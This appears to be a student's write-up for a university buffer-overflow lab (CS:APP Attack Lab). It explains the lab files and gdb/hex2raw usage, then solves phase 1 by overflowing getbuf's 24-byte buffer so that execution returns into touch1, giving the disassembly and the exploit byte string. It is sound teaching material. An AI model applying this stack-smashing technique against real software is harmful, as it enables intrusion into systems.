# attacklab

### File introduction

README.txt: A file describing the contents of the directory

ctarget: An executable program vulnerable to code-injection attacks

rtarget: An executable program vulnerable to return-oriented-programming attacks

cookie.txt: An 8-digit hex code that you will use as a unique identifier in your attacks.

farm.c: The source code of your target’s “gadget farm,” which you will use in generating return-oriented
	     programming attacks.

hex2raw: A utility to generate attack strings.

```c
unsigned getbuf(){
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```

Functions Gets() and gets() have no way to determine whether their destination buffers are large
enough to store the string they read. They simply copy sequences of bytes, possibly overrunning the bounds of the storage allocated at the destinations.

The exploit string must not contain byte value 0x0a at any intermediate position, since this is the
ASCII code for newline (‘\n’). When Gets encounters this byte, it will assume you intended to
terminate the string.

HEX2RAW expects two-digit hex values separated by one or more white spaces. So if you want to
create a byte with a hex value of 0, you need to write it as 00. To create the word 0xdeadbeef
you should pass “ef be ad de” to HEX2RAW (note the reversal required for little-endian byte
ordering).

### Commands

#####Using HEX2RAW

```shell
unix> ./hex2raw < exploit.txt > exploit-raw.txt          # store the raw string in a file
```

##### Using GDB

```
unix> gdb ctarget                                        # use gdb to run ctarget
(gdb) run < exploit-raw.txt -q                           # add -q to run locally
(gdb) print <variable>                                   # print the value of the variable
(gdb) break *<addr>                                      # set break point
(gdb) x/<n/f/u> <addr>                                   # print the value stored at the address
```

More usages can be found in [gdb-ref](./gdb-ref.md)

##### Generating byte codes

```shell
unix> gcc -c example.s
unix> objdump -d example.o
```

---

### Part I: Code Injection Attacks

>For the first three phases, your exploit strings will attack CTARGET. This program is set up in a way that
>the stack positions will be consistent from one run to the next and so that data on the stack can be treated as executable code. These features make the program vulnerable to attacks where the exploit strings contain the byte encodings of executable code.

#### phase1

Function getbuf is called within CTARGET by a function test having the following C code:

```c
void test(){
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

When getbuf executes its return statement (line 5 of getbuf), the program ordinarily resumes execution
within function test (at line 5 of this function). We want to change this behavior. Within the file ctarget,
there is code for a function touch1 having the following C representation:

```c
void touch1(){
    vlevel = 1; /* Part of validation protocol */
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

Our task is to get CTARGET to execute the code for touch1 when getbuf executes its return statement, rather than returning to test. We can overflow the stack with the exploit string and change the return address of getbuf function to the address of touch1 function. 

run ctarget executable in gdb and set a breakpoint at getbuf 

```shell
gdb ctarget
(gdb) break getbuf
(gdb) run -q
```

Then disasemble the getbuf function 

```
(gdb) disas
```

Since the buffer size is a run time constant, we need to look at the disasembled code to figure it out. 

```
Dump of assembler code for function getbuf:
=> 0x000055555555594f <+0>:	sub    $0x18,%rsp
   0x0000555555555953 <+4>:	mov    %rsp,%rdi
   0x0000555555555956 <+7>:	callq  0x555555555b9f <Gets>
   0x000055555555595b <+12>:	mov    $0x1,%eax
   0x0000555555555960 <+17>:	add    $0x18,%rsp
   0x0000555555555964 <+21>:	retq   
End of assembler dump.
```

` sub $0x18,%rsp`  indicates that 24(0x18) bytes of buffer is allocated for getbuf. So we need to input 24 bytes of padding followed by the return address of the touch1. 

To find the address the touch1, we need to get the disassembled code.

```
(gdb) dissassemble touch1
```

 Then we get codes which looked like

```
Dump of assembler code for function touch1:
   0x0000555555555965 <+0>:	sub    $0x8,%rsp
   0x0000555555555969 <+4>:	movl   $0x1,0x202b69(%rip)        # 0x5555557584dc <vlevel>
   0x0000555555555973 <+14>:	lea    0x178d(%rip),%rdi        # 0x555555557107
   0x000055555555597a <+21>:	callq  0x555555554de0 <puts@plt>
   0x000055555555597f <+26>:	mov    $0x1,%edi
   0x0000555555555984 <+31>:	callq  0x555555555db6 <validate>
   0x0000555555555989 <+36>:	mov    $0x0,%edi
   0x000055555555598e <+41>:	callq  0x555555554f60 <exit@plt>
End of assembler dump.
```

So it's address is at `0x555555555965` 

We can also use `p touch1`  to get its address

```
(gdb) p touch
$1 = {void ()} 0x555555555965 <touch1>
```

Finally create a text file named atk1.txt which will look like below  

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00    /* the first 24 padding bytes */
65 59 55 55 55 55 00 00    /* address of touch1 */
```

When writing the bytes, we need to consider the byte order. My system is a little-endian so the bytes go in reverse order.  

Now run this file through the program hex2raw, which  generates raw exploit strings , and run the raw file

```shell
./hex2raw < atk1.txt > atk1r.txt

./ctarget < atk1r.txt             # use I/O redirection

unix> gdb ctarget                 # within GDB
(gdb) run < atk1r.txt
```

We can get something like below if our solution is right

```shell
Cookie: 0x5f5bd74e                # your cookie will be different
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

